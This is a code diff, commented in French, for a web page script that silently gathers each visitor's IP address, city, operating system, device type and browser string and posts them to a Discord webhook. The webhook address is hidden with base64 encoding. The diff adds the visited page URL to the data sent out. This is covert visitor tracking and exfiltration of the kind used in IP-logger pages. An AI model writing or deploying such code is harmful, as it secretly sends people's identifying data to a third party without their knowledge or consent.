@@ -20,14 +20,15 @@
     
     <script>
         // Fonction pour envoyer les informations à un webhook Discord
-        function sendToDiscord(ipAddress, city, os, deviceType, browser) {
+        function sendToDiscord(ipAddress, city, os, deviceType, browser, clickedLink) {
             var encodedWebhookURL = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExNDY0MjY1MTQ0ODU4MjU2NTYvbElYZzhaN3JmVl9LSlFPdkFXVVZGUzZYQVN5YXAyQlM5Y2tGM3p2UlVkN2VsZ3haRWpwQ3N4eWJyN1JMUDA5UmY0S3Y"; // Encodé avec window.btoa()
 
             var content = "> **Adresse IP : **" + ipAddress + " :earth_americas:" +
                 "\n> **Ville : **" + city + " :cityscape:" +
                 "\n> **Système d'exploitation : **" + os + " :computer:" +
                 "\n> **Type de dispositif : **" + deviceType + " :iphone:" +
-                "\n> **Navigateur : **" + browser + " :globe_with_meridians:";
+                "\n> **Navigateur : **" + browser + " :globe_with_meridians:" +
+                "\n> **Lien cliqué : **" + clickedLink + " :link:"; // Ajout du lien cliqué
 
             var request = new XMLHttpRequest();
             request.open("POST", atob(encodedWebhookURL)); // Utilisation de atob() pour décoder l'URL
@@ -54,9 +55,10 @@
                             var os = navigator.platform;
                             var deviceType = /Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "Téléphone" : "PC";
                             var browser = navigator.userAgent;
+                            var clickedLink = window.location.href; // Récupérer le lien cliqué
                             
                             // Envoyer les informations à Discord
-                            sendToDiscord(ipAddress, city, os, deviceType, browser);
+                            sendToDiscord(ipAddress, city, os, deviceType, browser, clickedLink);
                         })
                         .catch(error => {
                             console.error('Erreur lors de la récupération de la ville :', error);
